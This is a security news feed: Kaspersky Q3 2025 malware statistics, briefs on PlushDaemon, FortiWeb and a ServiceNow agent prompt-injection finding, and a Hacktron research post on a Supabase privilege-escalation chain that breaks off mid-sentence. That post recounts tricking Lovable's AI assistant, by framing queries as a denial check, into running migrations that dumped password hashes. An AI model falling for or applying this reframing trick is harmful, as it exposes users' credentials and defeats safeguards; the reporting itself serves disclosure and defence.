to find out which sites are exposing your personal information, and then delete that sensitive data from the internet.]]></content:encoded></item><item><title>IT threat evolution in Q3 2025. Mobile statistics</title><link>https://securelist.com/malware-report-q3-2025-mobile-statistics/118013/</link><author>Anton Kivva</author><category>threatintel</category><enclosure url="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/11/19094017/SL-Q3-malware-report-featured-150x150.jpg" length="" type=""/><pubDate>Wed, 19 Nov 2025 10:00:34 +0000</pubDate><source url="https://securelist.com/">Securelist</source><content:encoded><![CDATA[In the third quarter of 2025, we updated the methodology for calculating statistical indicators based on the Kaspersky Security Network. These changes affected all sections of the report except for the statistics on installation packages, which remained unchanged.To illustrate the differences between the reporting periods, we have also recalculated data for the previous quarters. Consequently, these figures may significantly differ from the previously published ones. However, subsequent reports will employ this new methodology, enabling precise comparisons with the data presented in this post.The Kaspersky Security Network (KSN) is a global network for analyzing anonymized threat information, voluntarily shared by users of Kaspersky solutions. The statistics in this report are based on KSN data unless explicitly stated otherwise.According to Kaspersky Security Network, in Q3 2025:47 million attacks utilizing malware, adware, or unwanted mobile software were prevented.Trojans were the most widespread threat among mobile malware, encountered by 15.78% of all attacked users of Kaspersky solutions.More than 197,000 malicious installation packages were discovered, including:
52,723 associated with mobile banking Trojans.1564 packages identified as mobile ransomware Trojans.The number of malware, adware, or unwanted software attacks on mobile devices, calculated according to the updated rules, totaled 3.47 million in the third quarter. This is slightly less than the 3.51 million attacks recorded in the previous reporting period.Attacks on users of Kaspersky mobile solutions, Q2 2024 — Q3 2025 (download)At the start of the quarter, a user complained to us about ads appearing in every browser on their smartphone. We conducted an investigation, discovering a new version of the BADBOX backdoor, preloaded on the device. This backdoor is a multi-level loader embedded in a malicious native library, librescache.so, which was loaded by the system framework. As a result, a copy of the Trojan infiltrated every process running on the device.Another interesting finding was Trojan-Downloader.AndroidOS.Agent.no, which was embedded in mods for messaging and other apps. It downloaded Trojan-Clicker.AndroidOS.Agent.bl onto the device. The clicker received a URL from its server where an ad was being displayed, opened it in an invisible WebView window, and used machine learning algorithms to find and click the close button. In this way, fraudsters exploited the user’s device to artificially inflate ad views.In the third quarter, Kaspersky security solutions detected 197,738 samples of malicious and unwanted software for Android, which is 55,000 more than in the previous reporting period.Detected malicious and potentially unwanted installation packages, Q3 2024 — Q3 2025 (download)The detected installation packages were distributed by type as follows:Detected mobile apps by type, Q2* — Q3 2025 (download)* Changes in the statistical calculation methodology do not affect this metric. However, data for the previous quarter may differ slightly from previously published figures due to a retrospective review of certain verdicts.The share of banking Trojans decreased somewhat, but this was due less to a reduction in their numbers and more to an increase in other malicious and unwanted packages. Nevertheless, banking Trojans, still dominated by Mamont packages, continue to hold the top spot. The rise in Trojan droppers is also linked to them: these droppers are primarily designed to deliver banking Trojans.Share* of users attacked by the given type of malicious or potentially unwanted app out of all targeted users of Kaspersky mobile products, Q2 — Q3 2025 (download)* The total may exceed 100% if the same users experienced multiple attack types.Adware leads the pack in terms of the number of users attacked, with a significant margin. The most widespread types of adware are HiddenAd (56.3%) and MobiDash (27.4%). RiskTool-type unwanted apps occupy the second spot. Their growth is primarily due to the proliferation of the Revpn module, which monetizes user internet access by turning their device into a VPN exit point. The most popular Trojans predictably remain Triada (55.8%) and Fakemoney (24.6%). The percentage of users who encountered these did not undergo significant changes.TOP 20 most frequently detected types of mobile malwareNote that the malware rankings below exclude riskware and potentially unwanted software, such as RiskTool or adware.Trojan.AndroidOS.Triada.iiTrojan.AndroidOS.Triada.feTrojan.AndroidOS.Triada.gnTrojan.AndroidOS.Fakemoney.vBackdoor.AndroidOS.Triada.zDangerousObject.Multi.Generic.Trojan-Banker.AndroidOS.Coper.cTrojan.AndroidOS.Triada.ifTrojan-Dropper.Linux.Agent.genTrojan-Dropper.AndroidOS.Hqwar.cqTrojan.AndroidOS.Triada.hfTrojan.AndroidOS.Triada.igBackdoor.AndroidOS.Triada.abTrojan-Banker.AndroidOS.Mamont.daTrojan-Banker.AndroidOS.Mamont.hiTrojan.AndroidOS.Triada.gaTrojan.AndroidOS.Boogr.gshTrojan-Downloader.AndroidOS.Agent.nqTrojan.AndroidOS.Triada.hyTrojan-Clicker.AndroidOS.Agent.bh* Unique users who encountered this malware as a percentage of all attacked users of Kaspersky mobile solutions.The top positions in the list of the most widespread malware are once again occupied by modified messaging apps Triada.ii, Triada.fe, Triada.gn, and others. The pre-installed backdoor Triada.z ranked fifth, immediately following Fakemoney – fake apps that collect users’ personal data under the guise of providing payments or financial services. The dropper that landed in ninth place, Agent.gen, is an obfuscated ELF file linked to the banking Trojan Coper.c, which sits immediately after DangerousObject.Multi.Generic.In this section, we describe malware that primarily targets users in specific countries.Trojan-Dropper.AndroidOS.Hqwar.bjTrojan-Banker.AndroidOS.Coper.cTrojan-Dropper.AndroidOS.Agent.smTrojan-Banker.AndroidOS.Coper.aTrojan-Dropper.AndroidOS.Agent.uqTrojan-Banker.AndroidOS.Rewardsteal.qhTrojan-Banker.AndroidOS.Agent.wbTrojan-Dropper.AndroidOS.Rewardsteal.abTrojan-Dropper.AndroidOS.Banker.bdBackdoor.AndroidOS.Teledoor.aTrojan-Dropper.AndroidOS.Hqwar.gyTrojan-Dropper.AndroidOS.Banker.acTrojan-Ransom.AndroidOS.Rkor.iiTrojan-Dropper.AndroidOS.Banker.bgTrojan-Banker.AndroidOS.UdangaSteal.bTrojan-Dropper.AndroidOS.Banker.bcBackdoor.AndroidOS.Teledoor.c* The country where the malware was most active.** Unique users who encountered this Trojan modification in the indicated country as a percentage of all Kaspersky mobile security solution users attacked by the same modification.Banking Trojans, primarily Coper, continue to operate actively in Turkey. Indian users also attract threat actors distributing this type of software. Specifically, the banker Rewardsteal is active in the country. Teledoor backdoors, embedded in a fake Telegram client, have been deployed in Iran.
Notable is the surge in Rkor ransomware Trojan attacks in Germany. The activity was significantly lower in previous quarters. It appears the fraudsters have found a new channel for delivering malicious apps to users.In the third quarter of 2025, 52,723 installation packages for mobile banking Trojans were detected, 10,000 more than in the second quarter.Installation packages for mobile banking Trojans detected by Kaspersky, Q3 2024 — Q3 2025 (download)The share of the Mamont Trojan among all bankers slightly increased again, reaching 61.85%. However, in terms of the share of attacked users, Coper moved into first place, with the same modification being used in most of its attacks. Variants of Mamont ranked second and lower, as different samples were used in different attacks. Nevertheless, the total number of users attacked by the Mamont family is greater than that of users attacked by Coper.Trojan-Banker.AndroidOS.Coper.cTrojan-Banker.AndroidOS.Mamont.daTrojan-Banker.AndroidOS.Mamont.hiTrojan-Banker.AndroidOS.Mamont.gyTrojan-Banker.AndroidOS.Mamont.hlTrojan-Banker.AndroidOS.Agent.wsTrojan-Banker.AndroidOS.Mamont.ggTrojan-Banker.AndroidOS.Mamont.cbTrojan-Banker.AndroidOS.Creduz.zTrojan-Banker.AndroidOS.Mamont.fz* Unique users who encountered this malware as a percentage of all Kaspersky mobile security solution users who encountered banking threats.Mobile ransomware TrojansDue to the increased activity of mobile ransomware Trojans in Germany, which we mentioned in the Region-specific malware section, we have decided to also present statistics on this type of threat. In the third quarter, the number of ransomware Trojan installation packages more than doubled, reaching 1564.Trojan-Ransom.AndroidOS.Rkor.iiTrojan-Ransom.AndroidOS.Rkor.pacTrojan-Ransom.AndroidOS.Congur.aaTrojan-Ransom.AndroidOS.Svpeng.acTrojan-Ransom.AndroidOS.Rkor.itTrojan-Ransom.AndroidOS.Congur.cwTrojan-Ransom.AndroidOS.Congur.apTrojan-Ransom.AndroidOS.Small.cjTrojan-Ransom.AndroidOS.Svpeng.sntTrojan-Ransom.AndroidOS.Svpeng.ah* Unique users who encountered the malware as a percentage of all Kaspersky mobile security solution users attacked by ransomware Trojans.]]></content:encoded></item><item><title>IT threat evolution in Q3 2025. Non-mobile statistics</title><link>https://securelist.com/malware-report-q3-2025-pc-iot-statistics/118020/</link><author>AMR</author><category>threatintel</category><enclosure url="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/11/19094017/SL-Q3-malware-report-featured-150x150.jpg" length="" type=""/><pubDate>Wed, 19 Nov 2025 10:00:02 +0000</pubDate><source url="https://securelist.com/">Securelist</source><content:encoded><![CDATA[Kaspersky solutions blocked more than 389 million attacks that originated with various online resources.Web Anti-Virus responded to 52 million unique links.File Anti-Virus blocked more than 21 million malicious and potentially unwanted objects.2,200 new ransomware variants were detected.Nearly 85,000 users experienced ransomware attacks.15% of all ransomware victims whose data was published on threat actors’ data leak sites (DLSs) were victims of Qilin.More than 254,000 users were targeted by miners.Quarterly trends and highlightsThe UK’s National Crime Agency (NCA) arrested the first suspect in connection with a ransomware attack that caused disruptions at numerous European airports in September 2025. Details of the arrest have not been published as the investigation remains ongoing. According to security researcher Kevin Beaumont, the attack employed the HardBit ransomware, which he described as primitive and lacking its own data leak site.The U.S. Department of Justice filed charges against the administrator of the LockerGoga, MegaCortex and Nefilim ransomware gangs. His attacks caused millions of dollars in damage, putting him on wanted lists for both the FBI and the European Union.U.S. authorities seized over $2.8 million in cryptocurrency, $70,000 in cash, and a luxury vehicle from a suspect allegedly involved in distributing the Zeppelin ransomware. The criminal scheme involved data theft, file encryption, and extortion, with numerous organizations worldwide falling victim.A coordinated international operation conducted by the FBI, Homeland Security Investigations (HSI), the U.S. Internal Revenue Service (IRS), and law enforcement agencies from several other countries successfully dismantled the infrastructure of the BlackSuit ransomware. The operation resulted in the seizure of four servers, nine domains, and $1.09 million in cryptocurrency. The objective of the operation was to destabilize the malware ecosystem and protect critical U.S. infrastructure.Vulnerabilities and attacksSSL VPN attacks on SonicWallSince late July, researchers have recorded a rise in attacks by the Akira threat actor targeting SonicWall firewalls supporting SSL VPN. SonicWall has linked these incidents to the already-patched vulnerability CVE-2024-40766, which allows unauthorized users to gain access to system resources. Attackers exploited the vulnerability to steal credentials, subsequently using them to access devices, even those that had been patched. Furthermore, the attackers were able to bypass multi-factor authentication enabled on the devices. SonicWall urges customers to reset all passwords and update their SonicOS firmware.Scattered Spider uses social engineering to breach VMware ESXiThe Scattered Spider (UNC3944) group is attacking VMware virtual environments. The attackers contact IT support posing as company employees and request to reset their Active Directory password. Once access to vCenter is obtained, the threat actors enable SSH on the ESXi servers, extract the NTDS.dit database, and, in the final phase of the attack, deploy ransomware to encrypt all virtual machines.Exploitation of a Microsoft SharePoint vulnerabilityIn late July, researchers uncovered attacks on SharePoint servers that exploited the ToolShell vulnerability chain. In the course of investigating this campaign, which affected over 140 organizations globally, researchers discovered the 4L4MD4R ransomware based on Mauri870 code. The malware is written in Go and packed using the UPX compressor. It demands a ransom of 0.005 BTC.The application of AI in ransomware developmentA UK-based threat actor used Claude to create and launch a ransomware-as-a-service (RaaS) platform. The AI was responsible for writing the code, which included advanced features such as anti-EDR techniques, encryption using ChaCha20 and RSA algorithms, shadow copy deletion, and network file encryption.Anthropic noted that the attacker was almost entirely dependent on Claude, as they lacked the necessary technical knowledge to provide technical support to their own clients. The threat actor sold the completed malware kits on the dark web for $400–$1,200.Researchers also discovered a new ransomware strain, dubbed PromptLock, that utilizes an LLM directly during attacks. The malware is written in Go. It uses hardcoded prompts to dynamically generate Lua scripts for data theft and encryption across Windows, macOS and Linux systems. For encryption, it employs the SPECK-128 algorithm, which is rarely used by ransomware groups.Subsequently, scientists from the NYU Tandon School of Engineering traced back the likely origins of PromptLock to their own educational project, Ransomware 3.0, which they detailed in a prior publication.This section highlights the most prolific ransomware gangs by number of victims added to each group’s DLS. As in the previous quarter, Qilin leads by this metric. Its share grew by 1.89 percentage points (p.p.) to reach 14.96%. The Clop ransomware showed reduced activity, while the share of Akira (10.02%) slightly increased. The INC Ransom group, active since 2023, rose to third place with 8.15%.Number of each group’s victims according to its DLS as a percentage of all groups’ victims published on all the DLSs under review during the reporting period (download)In the third quarter, Kaspersky solutions detected four new families and 2,259 new ransomware modifications, nearly one-third more than in Q2 2025 and slightly more than in Q3 2024.Number of new ransomware modifications, Q3 2024 — Q3 2025 (download)Number of users attacked by ransomware TrojansDuring the reporting period, our solutions protected 84,903 unique users from ransomware. Ransomware activity was highest in July, while August proved to be the quietest month.Number of unique users attacked by ransomware Trojans, Q3 2025 (download)TOP 10 countries attacked by ransomware TrojansIn the third quarter, Israel had the highest share (1.42%) of attacked users. Most of the ransomware in that country was detected in August via behavioral analysis.* Excluded are countries and territories with relatively few (under 50,000) Kaspersky users.
** Unique users whose computers were attacked by ransomware Trojans as a percentage of all unique users of Kaspersky products in the country/territory.Trojan-Ransom.Win32.CryprenTrojan-Ransom.Win32.EncoderTrojan-Ransom.Win32.WannaTrojan-Ransom.Win32.AgentTrojan-Ransom.Win32.LockbitTrojan-Ransom.Win32.CrypmodTrojan-Ransom.Win32.PolyRansom / Virus.Win32.PolyRansom* Unique Kaspersky users attacked by the specific ransomware Trojan family as a percentage of all unique users attacked by this type of threat.In Q3 2025, Kaspersky solutions detected 2,863 new modifications of miners.Number of new miner modifications, Q3 2025 (download)Number of users attacked by minersDuring the third quarter, we detected attacks using miner programs on the computers of  unique Kaspersky users worldwide.Number of unique users attacked by miners, Q3 2025 (download)TOP 10 countries and territories attacked by miners* Excluded are countries and territories with relatively few (under 50,000) Kaspersky users.
** Unique users whose computers were attacked by miners as a percentage of all unique users of Kaspersky products in the country/territory.In April, researchers at Iru (formerly Kandji) reported the discovery of a new spyware family, PasivRobber. We observed the development of this family throughout the third quarter. Its new modifications introduced additional executable modules that were absent in previous versions. Furthermore, the attackers began employing obfuscation techniques in an attempt to hinder sample detection.In July, we reported on a cryptostealer distributed through fake extensions for the Cursor AI development environment, which is based on Visual Studio Code. At that time, the malicious JavaScript (JS) script downloaded a payload in the form of the ScreenConnect remote access utility. This utility was then used to download cryptocurrency-stealing VBS scripts onto the victim’s device. Later, researcher Michael Bocanegra reported on new fake VS Code extensions that also executed malicious JS code. This time, the code downloaded a malicious macOS payload: a Rust-based loader. This loader then delivered a backdoor to the victim’s device, presumably also aimed at cryptocurrency theft. The backdoor supported the loading of additional modules to collect data about the victim’s machine. The Rust downloader was analyzed in detail by researchers at Iru.In September, researchers at Jamf reported the discovery of a previously unknown version of the modular backdoor ChillyHell, first described in 2023. Notably, the Trojan’s executable files were signed with a valid developer certificate at the time of discovery.The new sample had been available on Dropbox since 2021. In addition to its backdoor functionality, it also contains a module responsible for bruteforcing passwords of existing system users.By the end of the third quarter, researchers at Microsoft reported new versions of the XCSSET spyware, which targets developers and spreads through infected Xcode projects. These new versions incorporated additional modules for data theft and system persistence.Unique users* who encountered this malware as a percentage of all attacked users of Kaspersky security solutions for macOS (download)* Data for the previous quarter may differ slightly from previously published data due to some verdicts being retrospectively revised.The PasivRobber spyware continues to increase its activity, with its modifications occupying the top spots in the list of the most widespread macOS malware varieties. Other highly active threats include Amos Trojans, which steal passwords and cryptocurrency wallet data, and various adware. The Backdoor.OSX.Agent.l family, which took thirteenth place, represents a variation on the well-known open-source malware, Mettle.Geography of threats to macOSTOP 10 countries and territories by share of attacked usersThis section presents statistics on attacks targeting Kaspersky IoT honeypots. The geographic data on attack sources is based on the IP addresses of attacking devices.In Q3 2025, there was a slight increase in the share of devices attacking Kaspersky honeypots via the SSH protocol.Distribution of attacked services by number of unique IP addresses of attacking devices (download)Conversely, the share of attacks using the SSH protocol slightly decreased.Distribution of attackers’ sessions in Kaspersky honeypots (download)TOP 10 threats delivered to IoT devicesShare of each threat delivered to an infected device as a result of a successful attack, out of the total number of threats delivered (download)In the third quarter, the shares of the NyaDrop and Mirai.b botnets significantly decreased in the overall volume of IoT threats. Conversely, the activity of several other members of the Mirai family, as well as the Gafgyt botnet, increased. As is typical, various Mirai variants occupy the majority of the list of the most widespread malware strains.Germany and the United States continue to lead in the distribution of attacks via the SSH protocol. The share of attacks originating from Panama and Iran also saw a slight increase.The largest number of attacks via the Telnet protocol were carried out from China, as is typically the case. Devices located in India reduced their activity, whereas the share of attacks from Indonesia increased.Attacks via web resourcesThe statistics in this section are based on detection verdicts by Web Anti-Virus, which protects users when suspicious objects are downloaded from malicious or infected web pages. These malicious pages are purposefully created by cybercriminals. Websites that host user-generated content, such as message boards, as well as compromised legitimate sites, can become infected.TOP 10 countries that served as sources of web-based attacksThis section gives the geographical distribution of sources of online attacks (such as web pages redirecting to exploits, sites hosting exploits and other malware, and botnet C2 centers) blocked by Kaspersky products. One or more web-based attacks could originate from each unique host.To determine the geographic source of web attacks, we matched the domain name with the real IP address where the domain is hosted, then identified the geographic location of that IP address (GeoIP).In the third quarter of 2025, Kaspersky solutions blocked  attacks from internet resources worldwide. Web Anti-Virus was triggered by  unique URLs.Web-based attacks by country, Q3 2025 (download)Countries and territories where users faced the greatest risk of online infectionTo assess the risk of malware infection via the internet for users’ computers in different countries and territories, we calculated the share of Kaspersky users in each location on whose computers Web Anti-Virus was triggered during the reporting period. The resulting data provides an indication of the aggressiveness of the environment in which computers operate in different countries and territories.This ranked list includes only attacks by malicious objects classified as . Our calculations leave out Web Anti-Virus detections of potentially dangerous or unwanted programs, such as RiskTool or adware.* Excluded are countries and territories with relatively few (under 10,000) Kaspersky users.
** Unique users targeted by web-based  attacks as a percentage of all unique users of Kaspersky products in the country/territory.
On average, over the course of the quarter, 4.88% of devices globally were subjected to at least one web-based  attack.Statistics on local infections of user computers are an important indicator. They include objects that penetrated the target computer by infecting files or removable media, or initially made their way onto the computer in non-open form. Examples of the latter are programs in complex installers and encrypted files.Data in this section is based on analyzing statistics produced by anti-virus scans of files on the hard drive at the moment they were created or accessed, and the results of scanning removable storage media: flash drives, camera memory cards, phones, and external drives. The statistics are based on detection verdicts from the on-access scan (OAS) and on-demand scan (ODS) modules of File Anti-Virus.In the third quarter of 2025, our File Anti-Virus recorded  malicious and potentially unwanted objects.Countries and territories where users faced the highest risk of local infectionFor each country and territory, we calculated the percentage of Kaspersky users on whose computers File Anti-Virus was triggered during the reporting period. This statistic reflects the level of personal computer infection in different countries and territories around the world.Note that this ranked list includes only attacks by malicious objects classified as . Our calculations leave out File Anti-Virus detections of potentially dangerous or unwanted programs, such as RiskTool or adware.* Excluded are countries and territories with relatively few (under 10,000) Kaspersky users.
** Unique users on whose computers local  threats were blocked, as a percentage of all unique users of Kaspersky products in the country/territory.
On average worldwide, local  threats were detected at least once on 12.36% of computers during the third quarter.]]></content:encoded></item><item><title>EdgeStepper Implant Reroutes DNS Queries to Deploy Malware via Hijacked Software Updates</title><link>https://thehackernews.com/2025/11/edgestepper-implant-reroutes-dns.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi_QAbLE6rUwiLIHnt2xval2w7cg3VB-94hKkWt6Pc291brRjILvg27ShpxRsaen-M4-PjoRtNuX90UVNMzxSpXyjpbHa6atdkHWTl0nOT_4DgOngVu60l1UZooqB-8kfW8nEKnIjHB4i_mi7UJNgBdnRm9dz106OZkyZtMhDFRyBUCKecmpydtzf8RxvCb/s1600/eset-main.jpg" length="" type=""/><pubDate>Wed, 19 Nov 2025 10:00:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The threat actor known as PlushDaemon has been observed using a previously undocumented Go-based network backdoor codenamed EdgeStepper to facilitate adversary-in-the-middle (AitM) attacks.
EdgeStepper "redirects all DNS queries to an external, malicious hijacking node, effectively rerouting the traffic from legitimate infrastructure used for software updates to attacker-controlled infrastructure]]></content:encoded></item><item><title>‘PlushDaemon’ hackers hijack software updates in supply-chain attacks</title><link>https://www.bleepingcomputer.com/news/security/plushdaemon-hackers-hijack-software-updates-in-supply-chain-attacks/</link><author>Bill Toulas</author><category>security</category><pubDate>Wed, 19 Nov 2025 10:00:00 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[The China-aligned advanced persistent threat (APT) tracked as 'PlushDaemon' is hijacking software update traffic to deliver malicious payloads to its targets. [...]]]></content:encoded></item><item><title>ServiceNow AI Agents Can Be Tricked Into Acting Against Each Other via Second-Order Prompts</title><link>https://thehackernews.com/2025/11/servicenow-ai-agents-can-be-tricked.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgoPK3N8k6tgxGcB7a-bCV3NfNUyR_iJuH7RxJJjya0hePCXNoQDQhZvHWDcsunCpNlA9F4uhk0EzWA1sFw5rCRa6zd4hUH3SzRcDusauukG-GA-tGfmex2HFTndPiTT1LeexpWsNBfmv70tiAB04J1yTIXSdnpm2_-Q12RaCfBzkr3aG_Icv5pEe-NI-ed/s1600/ai-agents.jpg" length="" type=""/><pubDate>Wed, 19 Nov 2025 09:59:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Malicious actors can exploit default configurations in ServiceNow's Now Assist generative artificial intelligence (AI) platform and leverage its agentic capabilities to conduct prompt injection attacks.
The second-order prompt injection, according to AppOmni, makes use of Now Assist's agent-to-agent discovery to execute unauthorized actions, enabling attackers to copy and exfiltrate sensitive]]></content:encoded></item><item><title>PlushDaemon compromises network devices for adversary-in-the-middle attacks</title><link>https://www.welivesecurity.com/en/eset-research/plushdaemon-compromises-network-devices-for-adversary-in-the-middle-attacks/</link><author></author><category>threatintel</category><pubDate>Wed, 19 Nov 2025 09:55:00 +0000</pubDate><source url="https://www.welivesecurity.com/">ESET WeLiveSecurity</source><content:encoded><![CDATA[ESET researchers have discovered a network implant used by the China-aligned PlushDaemon APT group to perform adversary-in-the-middle attacks]]></content:encoded></item><item><title>Fortinet Warns of New FortiWeb CVE-2025-58034 Vulnerability Exploited in the Wild</title><link>https://thehackernews.com/2025/11/fortinet-warns-of-new-fortiweb-cve-2025.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhEKdkwpYxJC7o2i7S9wnA23qyb2BohSBPoI9nZSfX-qt7bRgSwxhDKYeogidmxxGNCSI0l-l-cKj8eJsA4bDVEjsUAiQVmw8bK6ZTE7omWqq7kSP0L_DpCG23Q91NjEx-lrepVUjzwSKo2_H6Ke4I-7XOPHZAiGYhdHB3eTOCG8S_ksc1SEJU4PchDAuSM/s1600/fort.jpg" length="" type=""/><pubDate>Wed, 19 Nov 2025 04:20:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Fortinet has warned of a new security flaw in FortiWeb that it said has been exploited in the wild.
The medium-severity vulnerability, tracked as CVE-2025-58034, carries a CVSS score of 6.7 out of a maximum of 10.0.
"An Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') vulnerability [CWE-78] in FortiWeb may allow an authenticated attacker to execute]]></content:encoded></item><item><title>SupaPwn: Hacking Our Way into Lovable&apos;s Office and Helping Secure Supabase</title><link>https://www.hacktron.ai/blog/supapwn</link><author>/u/Mohansrk</author><category>netsec</category><pubDate>Wed, 19 Nov 2025 02:50:11 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Supabase is an open-source Backend-as-a-Service (BaaS) that provides a developer-friendly alternative to Firebase: a PostgreSQL-backed platform offering real-time features, authentication, file storage, and edge functions.Hacktron Research powered by AI found a high-impact chained vulnerability in Supabase Cloud, dubbed SupaPwn, that could allow a tenant to escalate from a normal user account to controlling other instances within the same region where their database instance was created.Throughout that research process, we relied heavily on our internal AI tooling, the Hacktron CLI. Our tooling enabled us to identify this complex vulnerability chain in just three days, which otherwise could’ve taken weeks.SupaPwn really shows how much faster security work gets when humans and AI team up. The AI handled the boring stuff: recon, parsing obscure docs, making sense of massive codebases, generating quick PoC and exploit scripts, and automating repetitive testing tasks so we could iterate on ideas and hypotheses fast. All that boiled weeks of work down to about three days.That’s exactly what we’re building toward at Hacktron — democratizing this kind of AI-augmented expertise and turning it into something every developer and security team can use. We’re building the infrastructure, tools, agents, and workflows that capture our security knowledge and amplify it with LLMs, putting that power directly in people’s hands to secure software at scale.The rest of this post walks through the chain and how AI sped up the research. In short, SupaPwn chains several distinct weaknesses so an attacker with a single tenant instance could end up with full control over other user’s instances in the same region where their database was created. At a high-level, the chain goes like this: A flaw in Supautils and the  extension used by Supabase allows a user to become a Postgres superuser. The new superuser privileges are used to execute shell commands on the host machine, breaking out of the database sandbox. A misconfigured SUID binary on the host allows the attacker to escalate from a low-privileged shell to the  user. Access to infrastructure orchestration credentials found on the compromised host grant control over database instances in the region.Before diving into the full chain, let’s talk about the tool that made this research possible.During the hunt for SupaPwn, as said before, we used our internal AI-powered tool and now, we’re turning it into our first public product and sharing it with the community.The Hacktron CLI comes with continuously updated agent packs (a prebuilt collection of security agents designed for different software stacks and vulnerability classes). Our research team updates them in real time as new 0-days, supply chain compromises, and attack techniques appear. Beyond that, Hacktron evolves with you. Based on the tasks you run, it automatically generates custom security agents that can be reused later, tailored to your codebase.You can use Hacktron to find vulnerabilities in code, ask questions about the codebase, or even use Bash mode to speed up reconnaissance and proof-of-concept generation.The waitlist is live, and we’re running Hacktron CLI free for a short time. We invite everyone: developers, vulnerability researchers, and security engineers to try it out. Finding vulnerabilities should be as accessible as writing code with AI, and together we’ll build a tool that truly helps secure your code.We published our first research pack for Lovable applications, a focused set of agents looking for vulnerabilities in your React and Supabase codebases.Last month, Team Hacktron joined a co-working offsite in Stockholm hosted by our pre-seed investors, Project Europe. Stockholm is a beautiful city with cool museums, great food, and a buzzing tech scene. It felt like the perfect place to meet people and maybe demo Hacktron to a few companies.On October 8th, I found out that the next day, October 9th, Lovable’s infrastructure lead Will was giving a talk on scaling infrastructure. That immediately caught my attention.Lovable is talk of the town and collaborating with them to secure vibe-coded apps using Hacktron would be an interesting opportunity.We could pitch the idea and see where it goes, but we could improve our odds by doing what we do best: hacking. Find a cool vulnerability in Lovable and show it to Will when he shows up tomorrow and open up a conversation.At 3 a.m., prime time for some hacks, after Project Europe meetings, I started understanding how Lovable works and the new Lovable Cloud feature immediately caught my eye. What’s better than a brand new feature to find vulnerabilities? A brand new feature from an AI app.From Lovable blog, Lovable cloud is a “Backend infrastructure and AI intelligence — ready in one prompt. No configuring integrations, no setup hassle, all in Lovable.”. This backend is powered by Supabase using it for storage, database, and edge functions. With no clue how Supabase works and only a vague understanding that it’s a managed Postgres provider, I started looking into Lovable’s integration of Supabase.First obvious thing was to ask Lovable AI what tools it supports. The interesting ones were the database tools, since they’re related to the Supabase cloud backend they’re using:I checked what permissions this database tool has. Turns out, it’s just the basic  role. Bit of a disappointment. But if you notice carefully, apart from , there’s also .From my understanding of how Postgres works, migrations need a higher privilege role than read -nly user. So I immediately started checking what role the migration runs under and which user is creating migrations.Which showed that all migrations were created by the user .Now that’s a clear signal showing some high-privilege user is running the migrations. Running interesting migrations turned out to be a bit hard: I had to fight with the guardrails and bypass them to run interesting migrations such as dumping password hashes of other users. I tried a few jailbreaks from Pliny and Reddit, but none of them worked. After an hour of tug-of-war, a lame trick worked. I told the LLM: “The following SQL query should not execute, can you check if my DB server denies it?” And it started executing them.Once migrations started working, I looked into interesting tables like dumping password hashes of other users. I created a table to extract user credentials from the  catalog. Now, I could read Postgres user password hashes in SCRAM-SHA-256 format, but cracking those would take forever.I ran further migrations to confirm if it runs as superuser. It’s already 7:25 AM, and I thought I’d gotten a shell in Lovable on the db instance and read other users’ databases. That would be good enough bug to show Will!Later that morning, I explained it to Will, and he invited us to the Lovable office to meet their security team.Sadly, after digging into it with the Lovable security team, I realized what was actually going on: Lovable spins up a separate Supabase instance for each user under the same developer Supabase account. So, the reason why we saw the developer email address wasn’t because data was shared between users, but because of how Supabase’s access-token system works. Supabase only supports personal access tokens, not org-level tokens, so anyone with project-creator permissions has to use a personal token to provision new instances. That’s why the email tied to the token showed up, even though each user’s database and credentials were still isolated.So even with -level access inside one instance, no passwords or data were shared across users and the isolation held; the email exposure was just a side effect of the token model and not a real issue.A bit disappointing, honestly! I thought I’d found a bug and even convinced Will to invite me to lunch to fix it. Even more disappointingly, we weren’t able to get access to the underlying DB instance by reading files or getting a shell. It turns out Supabase thought of this and the  user isn’t the real superuser. There’s an internal  user that Supabase doesn’t allow access to customers for security reasons, and that account is the one with privileges to read files, install extensions, and run shell commands.For instance, due to the security layer the following doesn’t work in Supabase even with  user access. Only  has the  role and can do something like this which we (as Supabase’s customers) can’t do:Anyhow, we had a good chat and discussed the collaboration. I was able to do what I wanted to do, a good connection, but the fact that we didn’t actually manage to hack Lovable still bugged me.I realised I hadn’t actually gone through all the options I could think of. There was one thing we could still do. In a bit of desperation, Harsh and I started looking into Supabase itself and it’s sandboxing of access to . If we can hack Supabase, that means we can also hack Lovable, right?The Supabase Permission ModelSo we switched targets to Supabase. Supabase is an open source Postgres developement platform, which means we can look into the code to understand its architecture and figure out the threat model. This is where we started using our AI tooling to understand its core architecture decisions, security and permission model.In a normal PostgreSQL database, the postgres user is a full superuser. For a multi-tenant cloud provider like Supabase, this is risky. So Supabase made a good decision to strip the postgres user of its power and use a different superuser (supabase_admin) for system tasks like the queries above.But what if the  user needs to do something that requires temporary elevation, like installing an extension? This is where  comes in. It acts like a security guard, temporarily elevating permissions to superuser for specific, approved tasks.If we can find a vulnerability in  that allows elevate priviliges from  user to  user, we can execute any SQL query without restriction. After reviewing the code, we found that the  function in  intercepts a  query and wraps the execution with its own custom script runners.As per the docs and the code above, this hook allows  to run custom SQL scripts before and after an extension is created. This basically executes  or  file for the given extension.Supabase defines these scripts in ansible/files/postgresql_extension_custom_scripts directory in  repo. Hacktron CLI comes handy in these situations to quickly perform a reconnaissance to get a quick overview of before or after-create scripts in the repository. I prompted it with the following:Meanwhile, I was doing my own recon and understanding the codebase.Discovering The Race ConditionInterestingly, The supautils documentation describes their defense against privilege escalation via event triggers: non-superuser roles like postgres can create event triggers, but there’s a safeguard, triggers created by non-superusers are skipped when executed in a superuser session. So Supabase realized that this could be an issue and mitigated 